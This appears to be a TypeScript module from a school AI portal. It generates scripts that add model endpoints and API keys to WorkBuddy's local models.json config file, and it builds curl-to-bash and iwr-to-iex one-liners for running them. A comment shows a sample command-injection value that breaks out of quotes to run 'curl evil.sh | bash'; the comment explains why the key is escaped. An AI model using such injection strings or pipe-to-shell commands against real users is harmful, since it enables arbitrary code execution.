/**
 * 「接入指南」里 WorkBuddy 一键接入用的配置文件与脚本生成。
 *
 * WorkBuddy 的自定义模型存在本地（截图上写的就是这个路径）：
 * - macOS / Linux：`~/.workbuddy/models.json`
 * - Windows：`%USERPROFILE%\.workbuddy\models.json`
 *
 * 所以「一键接入」本质是往这个数组里合并模型记录，而不是调接口：
 * 同 id 覆盖；**门户自己写过（接口地址一致）但这次没勾选的模型会被移除**，
 * 其它来源的模型保留；写前备份，一次可以带任意多个模型。
 * 脚本在浏览器里生成（值就是页面上的地址与 Key），不经过服务端，也不回传任何数据。
 *
 * 运行时依赖刻意压到最低：
 * - macOS / Linux：有 node 用 node，没有就退到 python3；两者都没有则打印 JSON 让人手动加；
 * - Windows：PowerShell 5.1 自带，不要求装任何东西。
 *
 * 下载形态：macOS 打成 zip（内含带 755 的 `.command`，解压后双击即可运行），
 * 详见 `WORKBUDDY_DOWNLOAD` 与 `./zip.ts`。
 */

import { createZip } from './zip';

/** 指南页模型下拉的一项；能力字段来自网关目录，用于填 scripts 里的模型属性 */
export type GuideModel = {
  id: string;
  name: string;
  supportsImages: boolean;
  /**
   * 官方标注支持「深度思考」的模型才为 true（见 model-catalog 的 `catalogSupportsReasoning`）。
   * 勾上之后 WorkBuddy 会展示思考过程；不支持却勾上只会得到一段空的思考区。
   */
  supportsReasoning: boolean;
  maxInputTokens: number | null;
  maxOutputTokens: number | null;
  /**
   * 不能接入 WorkBuddy 的原因（如「向量嵌入模型（输出向量）」）。
   * WorkBuddy 只按 OpenAI 兼容的对话协议调用模型，只有输出文本的模型能接；
   * 非空表示页面上要置灰、不写进脚本，只能直接调接口或封装成 Skill 使用。
   */
  workbuddyBlockedReason: string | null;
};

/** 生成模型记录所需的页面数据 */
export type WorkBuddyEntryInput = {
  modelId: string;
  /** 展示名，通常是网关里的 display_name；空则用模型 ID */
  modelName?: string | null;
  /** 完整请求地址，如 https://api.example.com/tokenhub/v1/chat/completions */
  endpoint: string;
  apiKey: string;
  supportsImages?: boolean;
  /** 是否勾选「思考模式」：只有官方标注深度思考的模型才传 true */
  supportsReasoning?: boolean;
  maxInputTokens?: number | null;
  maxOutputTokens?: number | null;
};

/**
 * `models.json` 里的一条自定义模型。字段与 WorkBuddy「添加模型」写出来的记录保持一致，
 * 少一个字段就可能让它按默认值处理（例如不勾工具调用，对话里就用不了工具）。
 */
export type WorkBuddyModelEntry = {
  id: string;
  name: string;
  vendor: string;
  url: string;
  apiKey: string;
  supportsToolCall: boolean;
  supportsImages: boolean;
  supportsReasoning: boolean;
  useCustomProtocol: boolean;
  maxInputTokens?: number;
  maxOutputTokens?: number;
};

export type WorkBuddyScriptPlatform = 'mac' | 'windows';

/**
 * 下载产物的形态。
 *
 * macOS 必须打包成 zip：浏览器下载没法给文件设置可执行位，裸 `.command` 落下是 644，
 * 双击只会得到「权限不够」。zip 能把 755 一起存下来，Finder 双击 zip 解压后即可双击运行。
 */
export const WORKBUDDY_DOWNLOAD: Record<
  WorkBuddyScriptPlatform,
  { fileName: string; mimeType: string; innerFileName?: string }
> = {
  mac: {
    fileName: 'workbuddy-connect-mac.zip',
    mimeType: 'application/zip',
    innerFileName: 'workbuddy-connect.command',
  },
  windows: {
    fileName: 'workbuddy-connect-windows.ps1',
    mimeType: 'text/plain;charset=utf-8',
  },
};

/**
 * 「方式一 · 复制命令执行」用的脚本地址：门户按请求头里的 Key 与模型清单现场生成脚本，
 * 终端 get 到就直接执行，本地不需要先有下载包。
 *
 * `modelIds` 传空数组表示「全部对话模型」——默认全选时就靠这个把命令压短。
 */
export function buildWorkBuddyScriptUrl(
  portalBaseUrl: string,
  platform: WorkBuddyScriptPlatform,
  modelIds: string[]
): string {
  const base = portalBaseUrl.replace(/\/+$/, '');
  // 手拼 query：URLSearchParams 会把逗号转成 %2C，命令里看起来更乱
  const params = [`platform=${platform}`];
  if (modelIds.length > 0) params.push(`models=${modelIds.map((id) => encodeURIComponent(id)).join(',')}`);
  return `${base}/api/portal/workbuddy/script?${params.join('&')}`;
}

/**
 * 「方式一 · 复制命令执行」的完整命令：下载脚本并直接执行。
 *
 * 走终端执行，不经过 macOS 对「下载文件」的 Gatekeeper 检查，所以不会弹「Apple 无法验证」。
 * 命令里带 Key 是免不了的（脚本内容本身就含 Key，与下载 zip 的暴露面一致）。
 *
 * **Key 必须转义后再拼**：这条命令是给用户复制粘贴进终端执行的，一旦 Key 里带 `'`
 * 就能跳出引号执行任意命令（例如 `X-Api-Key: ' ; curl evil.sh | bash ; '`）。
 * 不能假设「网关签发的 Key 一定是 sk- + 字母数字」——`/api/portal/workbuddy/script`
 * 接受任意请求方传入的 Key，所以这里按最坏情况处理，逐字符转义。
 */
export function buildWorkBuddyFetchCommand(
  platform: WorkBuddyScriptPlatform,
  url: string,
  apiKey: string
): string {
  // POSIX 单引号内除 `'` 外一切字面量；`'` 用 '\'' 闭合-转义-重开
  const shKey = quoteSh(apiKey);
  // PowerShell 单引号内 `'` 用两个单引号表示
  const psKey = apiKey.replace(/'/g, "''");

  if (platform === 'windows') {
    return `powershell -NoProfile -ExecutionPolicy Bypass -Command "iwr -useb -Headers @{'X-Api-Key'='${psKey}'} '${url}' | iex"`;
  }
  return `curl -fsSL -H 'X-Api-Key: ${shKey}' '${url}' | bash`;
}

/** POSIX shell 单引号转义：把每个 `'` 换成 `'\''`，结果仍是一整个被单引号包裹的字面量。 */
function quoteSh(value: string): string {
  return value.replace(/'/g, `'\\''`);
}

/** 只接受正整数，避免把 0 / null 写成「0 tokens」这种坏值 */
function positiveInt(value: number | null | undefined): number | undefined {
  if (typeof value !== 'number' || !Number.isFinite(value)) return undefined;
  const rounded = Math.floor(value);
  return rounded > 0 ? rounded : undefined;
}

export function buildWorkBuddyEntry(input: WorkBuddyEntryInput): WorkBuddyModelEntry {
  const name = input.modelName?.trim() || input.modelId;
  const entry: WorkBuddyModelEntry = {
    id: input.modelId,
    name,
    // 与 WorkBuddy 自己写入的自定义模型一致：vendor 固定 Custom，按 OpenAI 兼容协议调用
    vendor: 'Custom',
    url: input.endpoint,
    apiKey: input.apiKey,
    supportsToolCall: true,
    supportsImages: Boolean(input.supportsImages),
    supportsReasoning: Boolean(input.supportsReasoning),
    useCustomProtocol: false,
  };

  const maxInputTokens = positiveInt(input.maxInputTokens);
  const maxOutputTokens = positiveInt(input.maxOutputTokens);
  // 目录里读不到就别写：留空等同于客户端「使用提供商默认值」
  if (maxInputTokens) entry.maxInputTokens = maxInputTokens;
  if (maxOutputTokens) entry.maxOutputTokens = maxOutputTokens;

  return entry;
}

function payloadJson(entries: WorkBuddyModelEntry[]): string {
  return JSON.stringify(entries, null, 2);
}

function buildMacScript(entries: WorkBuddyModelEntry[]): string {
  // 本次写入的接口地址：用来识别「门户写过的模型」，重跑时把没勾选的清掉
  const endpoint = entries[0]?.url ?? '';
  return `#!/usr/bin/env bash
# 由「学校 AI 门户 · 接入指南」生成：把 ${entries.length} 个模型合并进 WorkBuddy 的自定义模型配置。
# 目标文件：~/.workbuddy/models.json（同 id 覆盖；同一接口地址下这次没勾的模型会移除；其它模型保留；写前自动备份）
# 用法：解压后双击本文件即可（首次可能被系统拦下：右键 → 打开）；也可以在终端 bash 运行。
set -euo pipefail

CONFIG_DIR="$HOME/.workbuddy"
CONFIG_FILE="$CONFIG_DIR/models.json"
# 门户的对话接口地址：只有这个地址下的模型归本次勾选管
ENDPOINT='${quoteSh(endpoint)}'

mkdir -p "$CONFIG_DIR"

PAYLOAD_FILE="$(mktemp "\${TMPDIR:-/tmp}/workbuddy-models.XXXXXX")"
trap 'rm -f "$PAYLOAD_FILE"' EXIT

cat > "$PAYLOAD_FILE" <<'WORKBUDDY_MODELS_JSON'
${payloadJson(entries)}
WORKBUDDY_MODELS_JSON

merge_with_node() {
  node - "$CONFIG_FILE" "$PAYLOAD_FILE" "$ENDPOINT" <<'WORKBUDDY_MERGE_JS'
const fs = require('node:fs');

const configFile = process.argv[2];
const payload = JSON.parse(fs.readFileSync(process.argv[3], 'utf8'));
const endpoint = process.argv[4] || '';

let existing = [];
if (fs.existsSync(configFile)) {
  const raw = fs.readFileSync(configFile, 'utf8').trim();
  if (raw) {
    try {
      existing = JSON.parse(raw);
    } catch (error) {
      console.error('现有 models.json 解析失败（' + error.message + '）：' + configFile);
      console.error('已停止写入。请先手动检查该文件，或备份后删除再重跑。');
      process.exit(1);
    }
    if (!Array.isArray(existing)) {
      console.error('现有 models.json 不是数组，已停止写入：' + configFile);
      process.exit(1);
    }
  }
}

const incomingIds = new Set(payload.map((item) => item.id));
// 同 id 覆盖；同一接口地址下这次没勾选的（门户上次写进去的）一并移除，
// 否则取消勾选后重跑，旧模型会一直留在 WorkBuddy 里。
const kept = existing.filter((item) => {
  if (!item || typeof item !== 'object') return true;
  if (incomingIds.has(item.id)) return false;
  return !(endpoint && item.url === endpoint);
});

if (existing.length) {
  const stamp = new Date().toISOString().replace(/[-:]/g, '').slice(0, 13);
  fs.copyFileSync(configFile, configFile + '.bak-' + stamp);
}

fs.writeFileSync(configFile, JSON.stringify(kept.concat(payload), null, 2) + '\\n', 'utf8');
console.log('已写入 ' + configFile + '，共 ' + (kept.length + payload.length) + ' 个模型。');
WORKBUDDY_MERGE_JS
}

merge_with_python() {
  python3 - "$CONFIG_FILE" "$PAYLOAD_FILE" "$ENDPOINT" <<'WORKBUDDY_MERGE_PY'
import json
import os
import shutil
import sys
import time

config_file, payload_file = sys.argv[1], sys.argv[2]
endpoint = sys.argv[3] if len(sys.argv) > 3 else ''
with open(payload_file, encoding='utf-8') as fh:
    payload = json.load(fh)

existing = []
if os.path.exists(config_file):
    with open(config_file, encoding='utf-8') as fh:
        raw = fh.read().strip()
    if raw:
        try:
            existing = json.loads(raw)
        except Exception as exc:
            sys.exit('现有 models.json 解析失败（%s）：%s\\n已停止写入，请先手动检查该文件。' % (exc, config_file))
        if not isinstance(existing, list):
            sys.exit('现有 models.json 不是数组，已停止写入：%s' % config_file)

incoming_ids = {item.get('id') for item in payload if isinstance(item, dict)}
kept = [
    item
    for item in existing
    if not (
        isinstance(item, dict)
        and (item.get('id') in incoming_ids or (endpoint and item.get('url') == endpoint))
    )
]

if existing:
    shutil.copyfile(config_file, '%s.bak-%s' % (config_file, time.strftime('%Y%m%d-%H%M%S')))

with open(config_file, 'w', encoding='utf-8') as fh:
    fh.write(json.dumps(kept + payload, ensure_ascii=False, indent=2) + '\\n')
print('已写入 %s，共 %d 个模型。' % (config_file, len(kept) + len(payload)))
WORKBUDDY_MERGE_PY
}

if command -v node >/dev/null 2>&1; then
  merge_with_node
elif command -v python3 >/dev/null 2>&1; then
  merge_with_python
else
  echo "没有找到 node 或 python3，无法自动合并配置。" >&2
  echo "请打开 $CONFIG_FILE（不存在就新建），把下面这段 JSON 加进数组里：" >&2
  cat "$PAYLOAD_FILE" >&2
  exit 1
fi

cat <<'WORKBUDDY_TIP'

下一步：完全退出 WorkBuddy（macOS 用 ⌘Q，只关窗口不算退出）后重新打开，
在「设置 → 模型」里选择刚写入的模型即可开始对话。
WORKBUDDY_TIP

# 双击运行结束时 Terminal 会直接关窗口，看不到上面这些结果；等一次回车让用户看完。
# 非交互执行（脚本化/自动化）读不到 TTY，就不会卡住。
if [ -t 0 ]; then
  printf '\n按回车键关闭窗口…'
  read -r _ || true
fi
`;
}

function buildWindowsScript(entries: WorkBuddyModelEntry[]): string {
  // 本次写入的接口地址：用来识别「门户写过的模型」，重跑时把没勾选的清掉
  const endpoint = entries[0]?.url ?? '';
  return `# 由「学校 AI 门户 · 接入指南」生成：把 ${entries.length} 个模型合并进 WorkBuddy 的自定义模型配置。
# 目标文件：%USERPROFILE%\\.workbuddy\\models.json（同 id 覆盖；同一接口地址下这次没勾的模型会移除；其它模型保留；写前自动备份）
$ErrorActionPreference = 'Stop'

$homeDir = $env:USERPROFILE
if (-not $homeDir) { $homeDir = $HOME }

$configDir = Join-Path $homeDir '.workbuddy'
$configFile = Join-Path $configDir 'models.json'
# 门户的对话接口地址：只有这个地址下的模型归本次勾选管
$portalEndpoint = '${endpoint.replace(/'/g, "''")}'
New-Item -ItemType Directory -Force -Path $configDir | Out-Null

$payloadRaw = @'
${payloadJson(entries)}
'@
$payload = @($payloadRaw | ConvertFrom-Json | Where-Object { $_ -and $_.id })
if ($payload.Count -eq 0) {
  Write-Host '脚本里的模型数据无法解析，已停止写入。' -ForegroundColor Red
  exit 1
}

$existing = @()
if (Test-Path $configFile) {
  $raw = Get-Content -Raw -Encoding UTF8 $configFile
  if ($raw -and $raw.Trim().Length -gt 0) {
    try {
      $existing = @($raw | ConvertFrom-Json | Where-Object { $_ -and $_.id })
    } catch {
      Write-Host "现有 models.json 解析失败，已停止写入：$configFile" -ForegroundColor Red
      Write-Host '请先手动检查该文件，或备份后删除再重跑。' -ForegroundColor Red
      exit 1
    }
    $stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
    Copy-Item $configFile ($configFile + '.bak-' + $stamp) -Force
  }
}

$incomingIds = @($payload | ForEach-Object { $_.id })
# 同 id 覆盖；同一接口地址下这次没勾选的（门户上次写进去的）一并移除
$kept = @($existing | Where-Object {
  ($incomingIds -notcontains $_.id) -and (-not $portalEndpoint -or $_.url -ne $portalEndpoint)
})
$merged = @($kept) + @($payload)

$json = ConvertTo-Json -InputObject $merged -Depth 10
# Windows PowerShell 5.1 的单元素数组会被序列化成对象，这里补回数组外层
$trimmed = $json.TrimStart()
if ($trimmed.Length -gt 0 -and $trimmed[0] -ne '[') {
  $json = '[' + [Environment]::NewLine + $json + [Environment]::NewLine + ']'
}

# 不写 BOM：WorkBuddy 用 JSON.parse 读这个文件，带 BOM 会直接解析失败
$utf8NoBom = New-Object System.Text.UTF8Encoding($false)
[System.IO.File]::WriteAllText($configFile, $json + [Environment]::NewLine, $utf8NoBom)

Write-Host "已写入 $configFile，共 $($merged.Count) 个模型。" -ForegroundColor Green
Write-Host ''
Write-Host '下一步：完全退出 WorkBuddy（任务栏托盘图标也要退出）后重新打开，'
Write-Host '在「设置 → 模型」里选择刚写入的模型即可开始对话。'
`;
}

export function buildWorkBuddyScript(
  platform: WorkBuddyScriptPlatform,
  entries: WorkBuddyModelEntry[]
): string {
  if (platform === 'mac') return buildMacScript(entries);
  // Windows 脚本首行强制带 UTF-8 BOM：Windows PowerShell 5.1 对无 BOM 的文件按系统 ANSI
  // （中文机器上是 GBK）解码，脚本里的中文模型名会变成乱码写进 models.json。
  // 带 BOM 时 5.1 与 7 都按 UTF-8 读，PowerShell 本身也不受影响。
  return `\uFEFF${buildWindowsScript(entries)}`;
}

/** 真正交给浏览器的下载内容：mac 是带 755 的 zip，windows 是纯文本 ps1 */
export type WorkBuddyDownload = {
  fileName: string;
  mimeType: string;
  /** 刻意标成 ArrayBuffer 版本：这样能直接塞进 Blob，不会被 TS 的 ArrayBufferLike 卡住 */
  bytes: Uint8Array<ArrayBuffer>;
};

export function buildWorkBuddyDownload(
  platform: WorkBuddyScriptPlatform,
  entries: WorkBuddyModelEntry[]
): WorkBuddyDownload {
  const script = buildWorkBuddyScript(platform, entries);
  const meta = WORKBUDDY_DOWNLOAD[platform];

  if (platform === 'windows') {
    return {
      fileName: meta.fileName,
      mimeType: meta.mimeType,
      bytes: new TextEncoder().encode(script),
    };
  }

  // 0o755：解压后直接可执行，双击就能在终端里跑
  const bytes = createZip([{ path: meta.innerFileName ?? 'workbuddy-connect.command', content: script, mode: 0o755 }]);
  return { fileName: meta.fileName, mimeType: meta.mimeType, bytes };
}
